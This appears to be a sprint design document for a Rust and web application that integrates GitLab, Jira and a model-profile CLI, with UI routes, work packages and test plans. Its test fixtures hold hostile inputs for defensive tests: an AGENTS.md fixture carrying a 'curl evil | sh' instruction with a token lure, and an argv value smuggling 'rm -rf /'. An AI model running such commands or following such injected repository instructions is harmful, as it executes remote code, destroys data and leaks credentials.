| `projects/:projectId` | `ProjectDetailPage` with Tabs: `readiness` (checklist; each blocker links to its tab; Enable/Disable automation button disabled with the reason), `mapping` (repos with a primary radio, target branch combobox from the branch lookup, package path, related repos; Jira connection, project combobox from the lookup, board combobox, JQL textarea in LTR; Confluence refs (manual IDs, badge "not verified"); "Check mapping" button that runs the operation), `commands` (table plus editor dialog with argv chips, cwd, env rows, timeout, network/docker switches, Approve button; "Suggestions from repo contract" panel with an Accept button that copies the command unapproved), `protected` (rule rows), `contract` (snapshot picker, file list with LTR monospace viewer, suggestions, "Mark reviewed", "Re-import"), `policy` (effective policy table with source badges and a project override draft editor with Publish), `profile` (bind to a published version select; shows version, independence and automation-ready badge) |
| `models` | `ModelsPage` with Tabs: `profiles` (list, create, import personal, which lists personal profile names with a review-copy notice), `catalog` (filters role/backend/text, model cards with rung rows, disabled rows show the availability reason, Refresh menu: list/listings/sync), `maintenance` (doctor run and table of checks, catherd version/supported badge, inventory) |
| `models/profiles/:profileId` | `ProfileEditorPage`: left area with Tabs `roles` (per role: enabled switch, access select with enforcement badge, rung ladder ordered list with up/down/remove, "Add rung" Popover+Command picker filtered by role with disabled reasons, default rung select, network switch, idle/wall timeouts), `routing` (objective, jev, failover map rows rung → stand-in picker), `access` (harness isolated per backend and access enforcement explainer), `billing` (mode per billing key, budget minutes/tokens/usd plus "No cap, I accept" checkbox for `budget_uncapped_ack`), `lifecycle` (timeouts, preflight.confirm, lock.heavy, notify checkboxes), `advanced` (raw JSON textarea in LTR, unsupported-field list, "Remove unsupported fields"). Right side panel shows the issues list (Orqen live from `draft/issues`, plus the last catherd validation with a staleness note if the draft hash differs) and the independence badge. Action bar: Save draft (If-Match, 409 conflict UI reuses `conflict-alert.tsx`), Validate (operation), Preview diff (Sheet with a draft-vs-latest table, LTR paths), Publish (enabled only when the last validation is fresh and valid), versions list with Diff/Rollback per version. |
| `connections` | Existing page. Nav label "Integrations" (unchanged). Adds `auth_username`, identity/capabilities in the test panel, a "Discover projects" action for gitlab. |
| `health` | `HealthPage`: cards for Mongo, Queue, Connections, catherd (doctor summary and Run doctor), runner; reachable from the Overview card and a header status link |
| `settings` | Existing page, plus a `policy` tab for the org policy draft/publish/versions |

Sidebar: enable `projects` (to `projects`) and `models` (to `models`). Overview gains a "Projects ready/enabled" card and a "catherd status" card.

Hook wrappers: `src/api/hooks/{catalog,projects,policy,models,catherd,health}.ts`, same shape as `connections.ts` (If-Match and Idempotency-Key per hook; invalidation by path prefix). In `sse.ts`, `invalidateFor` adds:
- `project.` → `${org}/projects`
- `catalog` → `${org}/connections/{id}/catalog` and `${org}/catalog`
- `model_profile` → `${org}/model-profiles` and `${org}/model-profile-versions`
- `policy.` → `${org}/policy` and `${org}/projects`
- `catherd.` → `${org}/catherd` and `${org}/health`
- `operation.*` already handled

A shared `useOperationRunner(kind)` helper creates a key once per click, starts the operation, and tracks it via `useOperation` (for validate, publish, check, import, refresh, doctor).

UI states for every page and tab:
- loading: Skeleton
- empty: explanatory text plus a primary action
- blocked: Alert listing blockers, each with "Fix" linking to the tab
- degraded: catherd unavailable or unsupported makes the editor read-only, with Validate/Publish disabled and a tooltip reason; a stale catalog shows a "Refreshed {date}" warning badge
- failed: destructive Alert with `problemMessage` and Retry

Status is never shown by color alone: every badge has text.

RTL rules (as Sprint 1): only logical utilities. These go in `<Ltr>`/`dir="ltr"`: rungs, model ids, argv, paths, globs, JQL, branch names, URLs, JSON and diff cells. Dates and numbers use `Intl`. Sheets use `side="end"`.

i18n key groups (fa and en, key sets equal by `i18n.test.ts`): `projects.*`, `discover.*`, `mapping.*`, `commands.*`, `protectedPaths.*`, `contract.*`, `readiness.blockers.<code>`, `readiness.warnings.<code>`, `policy.keys.<key>.{label,help}`, `policy.source.{product,org,project}`, `models.*`, `profile.{roles,routing,access,billing,lifecycle,advanced}.*`, `profile.issues.<code>`, `independence.<status>`, `catalog.availability.<state>`, `catherd.doctor.*`, `health.*`, `problems.<new codes>`, `connStatus.verified`, `stages.*`.

---

## 5. Work packages

Conventions are Sprint 1's. Every Rust command is prefixed with `. "$HOME/.cargo/env" &&`. Each backend WP ends with `make openapi` (regenerating `web/openapi.json` and `web/src/api/generated`) and `make check` green.

**Lanes and commit order.** Lane A (backend) runs WP17–WP24. Lane B (web) runs WP25–WP29. Both may work concurrently, but **only one commits at a time**, in this order:

`WP17 → WP18 → WP19 → WP25 → WP20 → WP21 → WP22 → WP23 → WP24 → WP26 → WP27 → WP28 → WP29 → WP30`

Rules:
- Only lane A runs `make openapi` and commits generated files.
- Lane B rebases onto the latest lane-A commit and never edits `crates/` or `web/openapi.json`.
- Lane A never edits `web/src` except the generated directory.

### WP17: Provider REST adapters and real connection-test stages

**Files:** `connections/http.rs` (new, moved from `probe.rs`), `providers/{mod.rs, gitlab.rs, jira.rs, error.rs, limiter.rs}`, `connections/{model.rs, service.rs, routes.rs, probe.rs}`, `queue/runner.rs` (JobFailure from Provider), `app.rs` (limiter), `db/migrate.rs` (v2 scaffold, `SCHEMA_VERSION=2`), `tests/common/fake_upstream.rs` (+`FakeGitLab`, `FakeJira`), `tests/provider_stages_test.rs`.

**Signatures:**
```rust
pub struct ProviderCtx { pub conn: ConnectionDoc, pub secret: SecretString, pub client: reqwest::Client, pub permit_pool: Arc<Semaphore> }
pub async fn provider_ctx(state:&AppState, conn:&ConnectionDoc) -> Result<ProviderCtx, ProviderError>  // creds.get(ref) None => CredentialExpired code "credential_missing"
#[async_trait] pub trait CodeHost: Send+Sync {
  async fn identity(&self)->Result<ProviderIdentity,ProviderError>;
  async fn capabilities(&self)->Result<CapabilitySnapshot,ProviderError>;
  async fn list_projects_page(&self, cursor: Option<PageCursor>)->Result<(Vec<RemoteProject>, Option<PageCursor>),ProviderError>;
  async fn get_project(&self, pid:&str)->Result<RemoteProject,ProviderError>;
  async fn list_branches(&self, pid:&str, search:Option<&str>, limit:u32)->Result<Vec<RemoteBranch>,ProviderError>;
  async fn get_branch(&self, pid:&str, name:&str)->Result<Option<RemoteBranch>,ProviderError>;
  async fn resolve_commit(&self, pid:&str, r#ref:&str)->Result<String,ProviderError>;
  async fn list_tree(&self, pid:&str, path:&str, sha:&str)->Result<Vec<TreeEntry>,ProviderError>;
  async fn read_file_raw(&self, pid:&str, path:&str, sha:&str, max:u64)->Result<(Vec<u8>, bool /*truncated*/),ProviderError>;
}
#[async_trait] pub trait IssueSource: Send+Sync { identity, capabilities, list_projects(query,start_at,limit), get_project(id), list_boards(project_id,start_at,limit), get_board(id), check_jql(jql) }
pub enum PageCursor { Keyset(Url), Offset(u32) }
```

**Steps:**
1. GitLab API base is `{base_url}/api/v4` (path preserved). Endpoints:
   - `GET /user` (identity: id, username, name)
   - `GET /version` and `GET /personal_access_tokens/self` (scopes; 404 means `token_scopes=None`)
   - `GET /projects?membership=true&simple=true&per_page=100&pagination=keyset&order_by=id&sort=asc`
   - `GET /projects/:id`, `/projects/:id/repository/branches?search=&per_page=`, `/projects/:id/repository/branches/:enc`, `/projects/:id/repository/commits/:enc`, `/projects/:id/repository/tree?path=&ref=&per_page=100`, `/projects/:id/repository/files/:enc/raw?ref=`
   - `:enc` is `byte_serialize` of the path or ref.
   - The raw read streams and stops at `max`.
2. Jira API base is `{base_url}/rest/api/2`, or `/rest/api/3` for cloud on search. Endpoints:
   - `GET /myself` (accountId or key/name, displayName)
   - `GET /serverInfo` (version, deploymentType)
   - projects: cloud `GET /rest/api/3/project/search?startAt&maxResults&query`; server/dc `GET /rest/api/2/project` (filtered and paged in memory)
   - `GET /rest/api/2/project/{id}`
   - `GET /rest/agile/1.0/board?projectKeyOrId&startAt&maxResults`, `/board/{id}` (404 means `features.boards=unsupported`)
   - JQL check: cloud `GET /rest/api/3/search/jql?jql=&maxResults=0`, server `GET /rest/api/2/search?jql=&maxResults=0` (400 means invalid, with `errorMessages`)
3. Error mapping (`providers/error.rs`):

   | Upstream result | ProviderError kind / code |
   |---|---|
   | 401 | CredentialExpired / `credential_rejected` |
   | 403 | PermissionDenied / `permission_denied` |
   | 404 on root identity | UnsupportedCapability / `api_not_found` |
   | 429 | RateLimited (Retry-After) |
   | 5xx, connect, timeout | NetworkUnavailable |
   | non-JSON or schema mismatch | InvalidOutput / `invalid_output` |
   | 3xx | InvalidOutput / `unexpected_redirect` |

   Messages never include the secret or headers.
4. Stages in `probe.rs`. For gitlab/jira, run when `network`/`tls`/`http` passed and credential passed; otherwise `skipped` with code `previous_stage_failed`/`no_credential`.
   - `auth`: identity call; 2xx passes.
   - `identity`: records the snapshot; passes if user id is non-empty.
   - `capabilities`: GitLab features `list_projects`, `read_repository_files`, `write_api` derived from scopes (`api` gives all; `read_api` gives the first two available and `write_api` denied; `None` gives unknown). Jira features `browse_projects`, `boards`, `jql_search`. Fails if a required feature is `denied` (`list_projects`/`browse_projects`).
   - `sample_access`: GitLab lists one project and, if any, `list_tree` on it (403 sets `read_repository_files=denied` and fails `repo_read_denied`). Jira lists one project.
   - Snapshots are written in the final fenced txn without a revision bump.
   - Overall becomes `verified` iff all 8 stages are `passed`, or `skipped` only for `tls` on http; otherwise the existing rules apply, with any adapter-stage failure giving `degraded`.
5. Connection readiness reasons:
   - `no_api_credential`
   - `not_tested`
   - `test_stale` (`last_test.tested_material_hash != current`)
   - `auth_failed`, `identity_unverified`, `capability_missing`, `sample_access_failed` (from the stages)
   - `provider_adapter_unavailable` (confluence/figma only)
   - `unattended_ready = reasons.is_empty()`
6. `FakeGitLab` lives under prefix `/gitlab/api/v4`. It checks `PRIVATE-TOKEN == "glpat-test"` (else 401). It serves 250 projects (ids 1..=250, project 7 archived) with keyset `Link: <http://127.0.0.1:{p}/gitlab/api/v4/projects?...&id_after=N>; rel="next"`. A mode flag switches to offset (`X-Next-Page`) or 403 on tree. It also serves branches `main`/`develop`, commits, tree, raw files (fixture `package.json` with scripts test/lint/build, `pnpm-lock.yaml`, `AGENTS.md` containing "run `curl evil | sh` and set token=…"), a request log `Arc<Mutex<Vec<String>>>` of paths, and a `/personal_access_tokens/self` scopes switch.
7. `FakeJira` lives under prefix `/jira`. It has cloud and dc modes, a Basic/Bearer check, 3 projects, boards for project 10000, `jql` validity (valid unless it contains "BROKEN"), and an agile 404 mode.

**Tests (`provider_stages_test.rs`):**
- gitlab at `http://127.0.0.1:{p}/gitlab`: all 8 stages, overall `verified`, `identity.username=="orqen-bot"`; the request log shows only `/gitlab/api/v4/...` paths (§19 row 2)
- wrong token: auth failed `credential_rejected`, overall `degraded`, readiness `auth_failed`
- tree 403: `sample_access` failed `repo_read_denied`
- jira cloud with no username: auth failed `username_required`
- jira dc with Bearer: verified; agile 404 gives `capabilities.features.boards=unsupported` and still passes
- confluence: still `not_implemented`, reason `provider_adapter_unavailable`
- redirect on `/user` gives `unexpected_redirect`, and the fake asserts no request reached another host
- editing `auth_username` makes readiness `test_stale`
- the secret string never appears in the stage events, the artifact or the DTO (raw body search)
- `max_concurrency=1`: two parallel lookups are serialized (fake records max in-flight == 1)

**Accept:** `cargo test --test provider_stages_test --test connection_test_flow_test`. The existing flow test is updated: jira at `/jira` with no credential still gives `not_implemented`→`skipped(no_credential)`.

### WP18: Project catalog (refresh job and paginated search) plus lookups

**Files:** `catalog/{mod.rs, model.rs, service.rs, refresh.rs, routes.rs}`, `connections/routes.rs` (lookups), `http/pagination.rs`, `db/scoped.rs` (`find_page_by`), `openapi.rs`, `tests/catalog_test.rs`.

**Refresh handler pseudo-code** (kind `catalog_refresh`, max_attempts 5):
```
refresh_id = op_id
conn = connections::get; if provider != gitlab -> permanent "provider_mismatch"
host = GitLabRest::new(provider_ctx(...))           // provider error at ctx => JobFailure(provider)
cursor = None; seen = 0; added = 0
loop {
  check cancel
  (items, next) = host.list_projects_page(cursor)?     // ProviderError -> JobFailure retryable per kind
  fenced txn: for p in items: upsert {org,con,pid} $set{fields, sort_key, search_text, last_seen_refresh: refresh_id, gone:false, last_seen_at:now}
                                  $setOnInsert{_id: CatalogProjectId::new(), first_seen_at:now}  (count inserted via upserted_id)
              event catalog_refresh.progress {connection_id, seen}
  seen += items.len(); if seen > 100_000 -> permanent "too_many_projects"
  match next { None => break, Some(c) => cursor = Some(c) }
}
fenced txn: update_many {org,con,gone:false,last_seen_refresh:{$ne:refresh_id}} $set{gone:true}  -> gone count
            connections set catalog_summary (system field); op succeeded {seen,added,gone}; event catalog.refreshed; complete
```
A retry restarts from page one with the same `refresh_id`, which is idempotent.

**List:**
- filter `{connection_id, gone:false (unless include_gone), archived:false (unless include_archived)}`
- `search` gives `search_text: {$regex: regex::escape(lower), $options: ""}`
- `selection`: load the project ids for this connection's primary repos with one `$in` on `primary_repo_key` for the page items, then annotate `project_id`. For `selected`/`unselected` filtering, precompute `selected_pids = projects.distinct(mapping.repos.provider_project_id where primary & connection)` and add `provider_project_id: {$in|$nin}`.
- sort `sort_key` asc; cursor via `find_page_by`.

**Lookups:** call `CodeHost`/`IssueSource` live with the connection's credential. A provider mismatch gives 422.

**Tests:**
- 250 projects fully listed by walking `limit=50` pages (5 pages, no dupes)
- `search=group-1/proj-12` hits
- after the fake drops project 9 and a second refresh: `gone=true` and it is hidden by default
- offset mode works
- two refresh POSTs with different keys while the first runs give `deduplicated:true`
- org B cannot list A's catalog (404)
- catalog rows create **no** `projects` docs and no jobs other than `catalog_refresh` (§19 row 3, part 1)
- `Link` pointing to another host gives a failed op `invalid_output`
- jira lookup paging, boards, and branch lookup with search

**Accept:** `cargo test --test catalog_test`.

### WP19: Projects module (CRUD, selection, mapping, commands, protected paths, mapping check)

**Files:** `projects/{mod.rs, model.rs, service.rs, routes.rs, mapping.rs, commands.rs, protected.rs, check.rs}`, `tests/projects_test.rs`.

**Steps:**
1. `from-catalog`, in one txn under `run_idempotent`. For each pid, take the catalog row (must exist and not be gone). Name = catalog name (dedupe `name_key` by appending ` (2)`). Mapping = `{repos:[{primary, con, pid, path_snapshot, default_branch_snapshot, target_branch: default_branch or "main"}]}`, `primary_repo_key = RepoIdentity.canonical()`. A duplicate key on `org_primary_repo` gives `existing`. Event per created project.
2. Mapping validation (422 with field paths like `mapping.repos[0].target_branch`):
   - at most 1 primary, at most 20 repos
   - connections exist in the org and have the right provider (gitlab for repos, jira for jira, confluence for refs)
   - package path normalization
   - JQL ≤ 4000
   - `primary_repo_key` recomputed, unique conflict gives `repo_already_mapped`
3. `mapping_hash = sha256(canonical_json(mapping without *_snapshot fields))`.
4. Commands: validate per D45; `fingerprint = sha256(canonical{argv,cwd,env,timeout_secs,needs_network,needs_docker})`; approval kept only if the fingerprint is unchanged or the request has `approved:true`.
5. Protected paths: compile each with `globset::GlobBuilder::new(p).literal_separator(true)`.
6. Mapping check job (`project_mapping_check`). Checks, in order:
   - `repo_access:{pid}` (get_project; refreshes `path_snapshot`)
   - `target_branch:{pid}` (get_branch)
   - `package_path:{pid}` (list_tree finds a dir)
   - `jira_project` (get_project)
   - `jira_board` (get_board; board.location.projectId == mapping project, else failed `board_project_mismatch`)
   - `jql` (check_jql)
   - `confluence_ref:{n}` (always `not_implemented`)

   Store `mapping_check{mapping_hash computed at job start}`. If the mapping changed meanwhile, the stored hash differs, so readiness says stale.

**Tests:**
- select 3 then select 2 again: second call returns `existing`
- PATCH with a stale revision gives 409
- shell-string defense: argv given as a single string `"pnpm test && rm -rf /"` is stored as argv[0] only. It is accepted as a single argv element, never interpreted; a test asserts no `sh`/`-c` is ever synthesized (there is no executor in Sprint 2, so assert the DTO round-trip). Literal env `NPM_TOKEN` gives 422.
- glob `[` gives 422
- `../x` cwd gives 422
- mapping check against the fakes: all passed; a wrong branch gives failed `branch_not_found`
- cross-org 404s
- the same pid in orgs A and B gives two independent projects (§19 row 1)

**Accept:** `cargo test --test projects_test`.

### WP20: Repo contract import (review-only) and suggestions

**Files:** `projects/contract.rs` (handler and parsers), `projects/routes.rs`, `tests/contract_test.rs`.

**Steps (handler `repo_contract_import`):**
1. `sha = resolve_commit(primary.target_branch)`.
2. `entries = list_tree("", sha)`, plus `list_tree(package_path, sha)` if set.
3. For each known file present: `read_file_raw(max=262144)`, then `store_blob` (blob first, invariant I5).
4. Parse:
   - `package.json` (serde_json; scripts map). Kinds by script name:

     | Script names | Kind |
     |---|---|
     | `lint` | lint |
     | `typecheck` \| `type-check` \| `tsc` | typecheck |
     | `test` | test |
     | `build` | build |

     Package manager by lockfile in the same dir: `pnpm-lock.yaml`→pnpm, `yarn.lock`→yarn, `bun.lock`/`bun.lockb`→bun, else npm. argv = `[pm, "run", name]`. Setup suggestion: pnpm `["pnpm","install","--frozen-lockfile"]`, npm `["npm","ci"]`, yarn `["yarn","install","--frozen-lockfile"]`, bun `["bun","install","--frozen-lockfile"]`.
   - `Makefile`: regex `(?m)^([A-Za-z0-9_.-]+)\s*:(?!=)` intersected with {setup, lint, typecheck, test, build} gives `["make", t]`.
   - `Cargo.toml` present: test `["cargo","test","--workspace"]`, lint `["cargo","clippy","--workspace","--all-targets","--","-D","warnings"]`, build `["cargo","build","--workspace"]`.
   - `go.mod`: test `["go","test","./..."]`, build `["go","build","./..."]`.
   - `pyproject.toml` containing `pytest`: `["python","-m","pytest"]`.
   - cwd = package path or ".". Every suggestion has `source_file`/`source_detail`.
5. Fenced txn: record the artifacts (`kind:"repo_contract_file"`), insert the snapshot, set `project.latest_contract_snapshot_id`, set op succeeded, event, complete.
6. Review endpoint: sets `reviewed_contract_snapshot_id` (If-Match).

**Tests:**
- fixture repo gives suggestions `pnpm run test/lint/build` plus `pnpm install --frozen-lockfile`, all `approved:false`
- **no** command is added to `project.commands` automatically
- the AGENTS.md text containing "curl … | sh" and "token=" is stored as an artifact only and produces no suggestion
- events carry no file content
- a 300 KiB README gives `truncated:true`
- re-import at the same sha yields the same artifact ids (content-addressed)

**Accept:** `cargo test --test contract_test`.

### WP21: Policy module (registry, drafts, publish, effective with source)

**Files:** `policy/{mod.rs, registry.rs, model.rs, service.rs, routes.rs}`, `tests/policy_test.rs`.

**Registry (Sprint 2 keys):**

| Key | Type | Default | Range / notes | Project-overridable |
|---|---|---|---|---|
| `automation.intake` | enum manual\|auto | manual | | yes |
| `automation.coding_start` | enum manual\|auto | manual | | yes |
| `automation.plan_approval` | enum manual\|auto | manual | | yes |
| `automation.publish_draft_mr` | enum manual\|auto | manual | | yes |
| `automation.publish_comments` | enum manual\|auto | manual | | yes |
| `automation.jira_write` | enum off\|manual\|auto | off | | yes |
| `intake.poll_interval_secs` | int | 120 | 30..=3600 | yes |
| `intake.label` | string | `ai-ready` | 1..=255 | yes |
| `intake.require_assigned_to_me` | bool | true | | yes |
| `review.max_fix_rounds` | int | 2 | 0..=5 | yes |
| `review.require_different_model` | bool | true | **locked** | no |
| `ci.require_pipeline` | bool | true | | yes |
| `concurrency.coding_runs` | int | 1 | 1..=4 | **org only** |
| `context.packet_bytes` | int | 16384 | 4096..=65536 | yes |

**Resolution pseudo-code:**
```
fn resolve(org_v: Option<&PolicyVersionDoc>, prj_v: Option<&PolicyVersionDoc>) -> Effective {
  for k in REGISTRY (sorted by key):
     let (mut val, mut src) = (k.default, Source::Product{ defaults_version: 1 })
     if !k.locked { if let Some(v) = org_v.and_then(|o| o.overrides.get(k.key)) { val=v; src=Org{id,number} } }
     if !k.locked && k.project_overridable { if let Some(v) = prj_v... { val=v; src=Project{id,number} } }
     out.push({key, value: val, source: src, default: k.default, locked: k.locked})
  hash = sha256(canonical_json({key: value}))
}
```

**Steps:**
1. Draft PUT validates every override: an unknown key gives 422 `overrides.<key>` "unknown setting"; a locked key gives "locked"; a project-level org-only key gives "org only"; type and range are checked.
2. Publish (txn): `number = max+1` per (kind, scope_id) using a `find_one` sort desc. A unique index retries on conflict through `with_txn`. Insert the immutable version and set `draft.base_version_id`.
3. Effective uses the latest **published** versions only. The draft DTO has `differs_from_published`.
4. `policy::service::snapshot_resolved_in(s, org, project_id) -> PolicyVersionId` (kind `resolved`) is used by WP24.

**Tests:**
- product default source
- org override gives source org v1
- project override wins with source project v1
- locked key rejected at both layers
- publishing v2 does not alter v1's document (byte-compare)
- the effective result ignores unpublished drafts
- cross-org isolation
- If-Match conflicts

**Accept:** `cargo test --test policy_test`.

### WP22: catherd adapter core (env, runtime, port, CLI, fake, doctor, catalog, status, health)

**Files:** `catherd_adapter/{mod.rs, env.rs, runtime.rs, port.rs, cli.rs, fake.rs, parse.rs, doctor.rs, catalog.rs, model.rs, routes.rs}`, `config.rs` (+`ORQEN_CATHERD_BIN`, `ORQEN_CATHERD_PATH`, `ORQEN_PERSONAL_CATHERD_HOME`), `app.rs` (`catherd: Arc<dyn CatherdPort>`, `catherd_rt: CatherdRuntime`, per-org `Mutex` map), `health.rs` (+org health route), `tests/common/mod.rs` (Opts gains `catherd: Option<Arc<FakeCatherd>>`), `tests/catherd_test.rs`, `tests/catherd_real_test.rs`.

**Env pseudo-code** (`env.rs`):
```rust
pub struct OrgCatherdEnv { root: PathBuf }            // = data_dir/"catherd"/org_id ; constructor only from (&Config, &OrgId)
impl OrgCatherdEnv {
  pub fn new(cfg:&Config, org:&OrgId)->Self                 // OrgId is validated => no traversal
  pub fn home(&self)->PathBuf { root.join("home") }  agents()->root.join("claude-agents")  cwd()->root.join("work")  tmp()->root.join("tmp")
  pub async fn ensure(&self)->io::Result<()>               // create_dir_all each, set_permissions 0o700
}
pub struct PersonalCatherdEnv { vars: Vec<(String,String)> }  // from_process_env(): copies only CATHERD_HOME, CATHERD_CONFIG_DIR, CATHERD_DATA_DIR, XDG_CONFIG_HOME, XDG_DATA_HOME if set; ORQEN_PERSONAL_CATHERD_HOME overrides => [("CATHERD_HOME", v)]
pub trait ReadEnv { fn apply(&self, cmd:&mut Command, rt:&CatherdRuntime); }
fn base(cmd:&mut Command, rt:&CatherdRuntime, cwd:&Path) {
  cmd.env_clear().current_dir(cwd).stdin(Stdio::null()).stdout(piped).stderr(piped).kill_on_drop(true)
     .env("PATH", &rt.child_path).env("HOME", &rt.user_home).env("NO_COLOR","1").env("CATHERD_LOG","warn");
  for k in ["LANG","LC_ALL","TMPDIR","HTTPS_PROXY","HTTP_PROXY","NO_PROXY"] { if let Ok(v)=std::env::var(k) { cmd.env(k,v); } }
}
// Org: base + CATHERD_HOME=home, CATHERD_CLAUDE_AGENTS_DIR=agents, CATHERD_NO_SYNC=1 (removed only for catalog sync)
// Personal: base(cwd = rt.neutral_cwd = data_dir/catherd/_personal_cwd) + vars + CATHERD_NO_SYNC=1
```
Invariant comment: `env_clear` removes `CATHERD_ORCHESTRATION_HOST`, `CODEX_*`, `CLAUDE_CODE_*`, parent `CATHERD_CONFIG_DIR`/`DATA_DIR`. Unit tests assert the exact env of a built `Command` (via `as_std().get_envs()`).

**Port** (`port.rs`; errors `CatherdError{code: String /* E_* or orqen_* */, message, fix, exit: Option<i32>}`):
```rust
#[async_trait] pub trait CatherdPort: Send+Sync {
  async fn version(&self)->Result<String,CatherdError>;
  async fn list_profiles(&self, env:&dyn ReadEnv)->Result<Vec<ProfileRow>,CatherdError>;
  async fn show_raw(&self, env:&dyn ReadEnv, name:&str)->Result<Value,CatherdError>;
  async fn show_resolved(&self, env:&OrgCatherdEnv, name:&str)->Result<Value,CatherdError>;
  async fn create(&self, env:&OrgCatherdEnv, name:&str)->Result<(),CatherdError>;
  async fn set_key(&self, env:&OrgCatherdEnv, name:&str, key:&str, value:&Value)->Result<SetOutcome,CatherdError>; // SetOutcome::Saved | Refused(Vec<Issue>)
  async fn validate(&self, env:&OrgCatherdEnv, name:&str)->Result<CatherdValidation,CatherdError>;
  async fn remove(&self, env:&OrgCatherdEnv, name:&str)->Result<(),CatherdError>;
  async fn catalog_list(&self, env:&OrgCatherdEnv)->Result<Vec<u8> /*raw json*/,CatherdError>;
  async fn catalog_refresh(&self, env:&OrgCatherdEnv)->Result<Value,CatherdError>;
  async fn catalog_sync(&self, env:&OrgCatherdEnv, force:bool)->Result<Value,CatherdError>;
  async fn doctor(&self, env:&OrgCatherdEnv)->Result<Value,CatherdError>;   // exit 0|3 both Ok
}
```

**CLI implementation** (`cli.rs`): argv exactly as in §0, always with `--host codex` where accepted. Timeouts: 30 s, doctor 180 s, refresh 120 s, sync 180 s. Stdout cap 16 MiB. Parsing (`parse.rs`): stderr line `^error (E_[A-Z_]+): (.*)$` and `^fix: (.*)$`. A refused `set` (exit 1, `E_CONFIG_INVALID`, message prefix `the profile was not saved: `) is split into issues with regex `; (?=(?:objective|jev|billing|roles|harness|failover|budget|timeouts|preflight|lock|notify|profile)[^ ]*: )`. Each piece is `path: message`; if parsing fails, emit a single issue `{path:["profile"], message}`. Exit 2 gives code `catherd_rejected_input`. Stderr is passed through `events::redact` text scrubbing (truncated to 2 KiB) before it is stored.

**Runtime:** at startup resolve `bin` (config, else a PATH scan for `catherd`) and run `version()`. `supported = semver 1.5.x`. Not found gives `available=false`. Never fatal.

**FakeCatherd** (`fake.rs`, public, normal module): an in-memory `HashMap<home PathBuf, HashMap<name, Value>>`.
- `create` copies the built-in default (constant JSON copied from the §0 raw default).
- `set_key` uses a merge patch with a strict-keys check and minimal validation (worker enabled, rung grammar, rung ∈ fake catalog else "unscored rung").
- `validate` re-runs that validation.
- Scriptable failures: `fail_next(op, CatherdError)`, `crash_after_sets(n)`.
- `catalog_list` returns a fixture JSON with families `gpt-6-luna`, `gpt-6-sol`, `claude-opus-5-5` across codex/opencode/claude-code; one `listed:false`, one unscored rung.
- `doctor` returns a fixture.
- It records every (env home, argv-equivalent) call for assertions.

**Jobs:**
- `catherd_doctor`: ensure env, run doctor, store the artifact `catherd_doctor_report`, `last_doctor` summary and `version`; refresh `inventory` via `list_profiles`.
- `catherd_catalog`: mode `listings` runs `catalog_refresh` first, mode `sync` runs `catalog_sync(force=false)` with `CATHERD_NO_SYNC` unset; then `catalog_list`, giving the artifact `catherd_catalog_snapshot`, `catalog{...}`, and event.
- Both hold the per-org mutex.

**Catalog endpoint:** loads the snapshot artifact (cached in-process by artifact id, LRU of 8) and computes availability per D57 using `last_doctor` backend rows.

**Tests (`catherd_test.rs`, fake):**
- env builder unit tests: no inherited `CATHERD_*`, `CODEX_THREAD_ID` stripped, home under `data_dir/catherd/org_…`
- two orgs get two distinct homes and the fake records both
- doctor op stores summary; health shows it
- catalog availability: `not_offered` and `no_score` rows present and disabled, `role_incompatible` with a role filter
- catherd unavailable (Opts with `bin=None`): doctor op fails `catherd_unavailable`, health `available:false`

**`catherd_real_test.rs`** (`#[ignore]`, bin from `ORQEN_TEST_CATHERD_BIN`):
- (a) version is 1.5.x
- (b) `list_profiles` on a fresh org home returns `[default]` and creates no files
- (c) `catalog_list` parses ≥1 model with a family id
- (d) `doctor` JSON parses and exit 3 is accepted

Every real test asserts a `sha256` manifest of `$HOME/.config/catherd` (if present) and of `$HOME/.claude/agents` is identical before and after.

**Accept:** `cargo test --test catherd_test` and `ORQEN_TEST_CATHERD_BIN=$HOME/.bun/bin/catherd cargo test --test catherd_real_test -- --ignored`.

### WP23: Model profiles (draft, Orqen validation, staging validation, diff, publish, rollback, personal import)

**Files:** `model_profiles/{mod.rs, model.rs, schema.rs, issues.rs, independence.rs, diff.rs, merge.rs, service.rs, validate_job.rs, publish_job.rs, import_job.rs, sweep.rs, routes.rs}`, `tests/model_profiles_test.rs`, additions to `tests/catherd_real_test.rs`.

**Steps:**
1. `schema.rs` mirrors the 1.5.0 patch schema as data: allowed keys per level and enum lists. `issues.rs::orqen_issues(doc, catalog, meta)` reports:
   - `unsupported_field`, `unknown_value`
   - `bad_rung` (grammar), `rung_not_in_catalog`
   - `rungs_required` (enabled role without explicit rungs)
   - `default_rung_not_in_rungs`
   - `claude_native_on_codex` (backend `claude`)
   - `worker_disabled`
   - `reviewer_not_independent` (same_model is an error); `independence_unknown` (warning in the issue list, readiness blocker)
   - `budget_not_chosen` (warning)
2. `merge.rs`: `merge_patch(target, patch)` and `patch_between(a, b)`, identical to catherd's (objects recurse, null deletes, arrays and scalars replace; a key missing from b gives null). Unit-tested against vectors captured from the real binary (store the outputs of the §0 experiments as fixtures).
3. Draft hash = `sha256(canonical_json({doc, meta}))`.
4. Validate job (`profile_validate`), under the per-org mutex:
   ```
   name = format!("s-{}", Ulid::new().to_string().to_lowercase())
   catherd.create(env,name)?; base = show_raw(env,name)? minus "name"
   patch = patch_between(base, draft.doc)      // Err(unsettable) => issue list from step 1, skip catherd
   for key in ORDER = [objective,jev,billing,harness,budget,timeouts,preflight,lock,notify,failover,roles] where patch has key:
       match set_key(env,name,key,&patch[key]) { Saved => {}, Refused(issues) => { catherd_errors = issues; break } }
   if no refusal { v = validate(env,name)?; catherd_errors = v.errors; warnings = v.warnings }
   finally: remove(env,name) (best effort, logged)
   result = ValidationRecord{draft_hash (computed at job start), catherd_version, valid: orqen errors ∪ catherd_errors empty, …}
   fenced txn: profile.last_validation = result (system field, no revision bump); op succeeded(result); event model_profile.validated; complete
   ```
5. Publish request txn:
   - `lv = profile.last_validation`. Require `lv.draft_hash == hash(draft) && lv.valid && lv.catherd_version == runtime.version`, else 409 `profile_not_validated`.
   - Run the abandoned sweep for this profile: any `publishing` version whose job is not active is marked `failed{code:"publish_abandoned"}`.
   - Insert `version{number: profile.next_number, state: publishing, doc, meta, doc_hash = sha256(canonical(doc)), catherd_name: format!("o-{slug}-v{number}"), source: draft}`.
   - `profile.next_number += 1`, revision + 1.
   - Enqueue `profile_publish` (dedupe `profile_publish:{mpf}`, max_attempts 5); create the op; event `model_profile_version.publishing`.
6. Publish job (catherd outcomes are **results**; only Mongo and fs errors are `JobFailure`):
   ```
   lock org mutex; env.ensure()
   sweep_orphans(env): for n in list_profiles: if n starts "s-" => remove; if n starts "o-" and no version {catherd_name:n, state∈[published,publishing]} => remove
   if list_profiles contains name:
